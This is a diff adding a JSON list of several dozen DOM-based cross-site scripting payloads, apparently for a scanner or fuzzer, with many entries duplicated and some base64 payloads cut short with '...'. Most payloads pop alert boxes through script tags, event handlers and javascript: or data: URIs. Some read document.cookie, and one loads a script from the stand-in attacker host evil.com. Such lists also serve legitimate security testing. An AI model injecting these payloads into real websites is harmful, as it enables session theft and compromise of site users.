@@ -1,0 +1,399 @@
+{
+  "payloads": [
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with document.location",
+      "payload": "document.location='javascript:alert(1)'"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS using getElementById",
+      "payload": "document.getElementById('test').innerHTML='<img src=x onerror=alert(1)>'"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS via eval",
+      "payload": "eval('alert(1)')"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with innerHTML",
+      "payload": "document.body.innerHTML='<svg onload=alert(1)>'"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script tag",
+      "payload": "<script>alert('DOM XSS')</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with javascript URI",
+      "payload": "javascript:alert('DOM XSS')"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with data URI",
+      "payload": "data:text/html,<script>alert('DOM XSS')</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with SVG onload",
+      "payload": "<svg/onload=alert('DOM XSS')>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe src",
+      "payload": "<iframe src=\"javascript:alert('DOM XSS')\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe srcdoc",
+      "payload": "<iframe srcdoc=\"<script>alert('DOM XSS')</script>\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with image onerror",
+      "payload": "<img src=\"x\" onerror=\"alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with video src",
+      "payload": "<video src=\"javascript:alert('DOM XSS')\"></video>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with object data",
+      "payload": "<object data=\"javascript:alert('DOM XSS')\"></object>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with embed src",
+      "payload": "<embed src=\"javascript:alert('DOM XSS')\"></embed>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with anchor href",
+      "payload": "<a href=\"javascript:alert('DOM XSS')\">Click</a>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with button onclick",
+      "payload": "<button onclick=\"alert('DOM XSS')\">Click me</button>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with input onfocus",
+      "payload": "<input type=\"text\" onfocus=\"alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with textarea onfocus",
+      "payload": "<textarea onfocus=\"alert('DOM XSS')\">Text</textarea>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with div onmouseover",
+      "payload": "<div onmouseover=\"alert('DOM XSS')\">Hover me</div>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with form action",
+      "payload": "<form action=\"javascript:alert('DOM XSS')\"><button type=\"submit\">Submit</button></form>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with details ontoggle",
+      "payload": "<details ontoggle=\"alert('DOM XSS')\"></details>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with base href",
+      "payload": "<base href=\"javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with SVG use href",
+      "payload": "<svg><use href=\"data:text/html,<script>alert('DOM XSS')</script>\"></use></svg>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with audio src",
+      "payload": "<audio src=\"javascript:alert('DOM XSS')\"></audio>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with keygen autofocus onfocus",
+      "payload": "<keygen autofocus onfocus=\"alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with meta refresh",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with object SVG",
+      "payload": "<object type=\"image/svg+xml\" data=\"data:image/svg+xml;base64,...\"></object>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe data URI",
+      "payload": "<iframe src=\"data:text/html,<script>alert('DOM XSS')</script>\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with video data URI",
+      "payload": "<video src=\"data:text/html,<script>alert('DOM XSS')</script>\"></video>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script data URI",
+      "payload": "<script src=\"data:text/javascript,alert('DOM XSS')\"></script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with math maction xlink:href",
+      "payload": "<math><maction xlink:href=\"javascript:alert('DOM XSS')\">Click</maction></math>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with meta charset",
+      "payload": "<meta charset=\"x-user-defined\" http-equiv=\"X-XSS-Protection\" content=\"javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with form submit",
+      "payload": "<form><input type=\"submit\" formaction=\"javascript:alert('DOM XSS')\"></form>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with div background image",
+      "payload": "<div style=\"background-image:url(javascript:alert('DOM XSS'))\"></div>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with img onerror eval",
+      "payload": "<img src=\"x\" onerror=\"javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with link href",
+      "payload": "<link href=\"javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with style import",
+      "payload": "<style>@import \"javascript:alert('DOM XSS')\";</style>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script alert cookie",
+      "payload": "<script>alert(document.cookie)</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with title onpropertychange",
+      "payload": "<title onpropertychange=\"alert('DOM XSS')\">Title</title>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with anchor data URI",
+      "payload": "<a href=\"data:text/html;base64,...\">Click</a>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with form button",
+      "payload": "<form><button formaction=\"javascript:alert('DOM XSS')\">Submit</button></form>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with input button onclick",
+      "payload": "<input type=\"button\" value=\"Click\" onclick=\"alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with SVG desc CDATA",
+      "payload": "<svg><desc><![CDATA[<script>alert('DOM XSS')</script>]]></desc></svg>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with body onresize",
+      "payload": "<body onresize=\"alert('DOM XSS')\"></body>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with svg use data URI",
+      "payload": "<svg><use href=\"data:text/html;base64,...\"></use></svg>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe src data URI",
+      "payload": "<iframe src=\"data:text/html;base64,...\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with body onhashchange",
+      "payload": "<body onhashchange=\"alert('DOM XSS')\"></body>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script document write",
+      "payload": "<script>document.write('<img src=\"x\" onerror=\"alert(\'DOM XSS\')\">')</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with svg foreignObject",
+      "payload": "<svg><foreignObject><script>alert('DOM XSS')</script></foreignObject></svg>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with meta charset",
+      "payload": "<meta charset=\"utf-8\" content=\"javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with video poster",
+      "payload": "<video poster=\"javascript:alert('DOM XSS')\"></video>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script external src",
+      "payload": "<script src=\"//evil.com/xss.js\"></script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script document write img",
+      "payload": "<script>document.write('<img src=\"x\" onerror=\"alert(\'DOM XSS\')\">')</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe data URI",
+      "payload": "<iframe src=\"data:text/html;base64,...\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with body onpageshow",
+      "payload": "<body onpageshow=\"alert('DOM XSS')\"></body>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe data URI",
+      "payload": "<iframe src=\"data:text/html;base64,...\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with meta refresh",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with div onclick",
+      "payload": "<div onclick=\"alert('DOM XSS')\">Click me</div>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with anchor href",
+      "payload": "<a href=\"javascript:alert('DOM XSS')\">Link</a>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe src",
+      "payload": "<iframe src=\"javascript:alert('DOM XSS')\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with object data",
+      "payload": "<object data=\"javascript:alert('DOM XSS')\"></object>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with svg g onload",
+      "payload": "<svg><g onload=\"alert('DOM XSS')\"></g></svg>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with meta charset",
+      "payload": "<meta charset=\"utf-8\" content=\"javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with body onpageshow",
+      "payload": "<body onpageshow=\"alert('DOM XSS')\"></body>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script alert domain",
+      "payload": "<script>alert(document.domain)</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with div background image",
+      "payload": "<div style=\"background:url(javascript:alert('DOM XSS'))\">Background Image</div>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script alert",
+      "payload": "<script>alert('DOM XSS')</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with video src",
+      "payload": "<video src=\"javascript:alert('DOM XSS')\"></video>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with base href",
+      "payload": "<base href=\"javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe src data URI",
+      "payload": "<iframe src=\"data:text/html,<script>alert('DOM XSS')</script>\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with object data",
+      "payload": "<object data=\"javascript:alert('DOM XSS')\"></object>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with style import",
+      "payload": "<style>@import \"javascript:alert('DOM XSS')\";</style>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with div background image",
+      "payload": "<div style=\"background:url(javascript:alert('DOM XSS'))\">Background Image</div>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with iframe src data URI",
+      "payload": "<iframe src=\"data:text/html,<script>alert('DOM XSS')</script>\"></iframe>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with meta refresh",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('DOM XSS')\">"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with svg onload",
+      "payload": "<svg onload=\"alert('DOM XSS')\"></svg>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script alert cookie",
+      "payload": "<script>alert(document.cookie)</script>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with div background image",
+      "payload": "<div style=\"background:url(javascript:alert('DOM XSS'))\">Background Image</div>"
+    },
+    {
+      "type": "basic_dom_based_xss",
+      "description": "DOM-based XSS with script alert",
+      "payload": "<script>alert('DOM XSS')</script>"
+    }
+  ]
+}
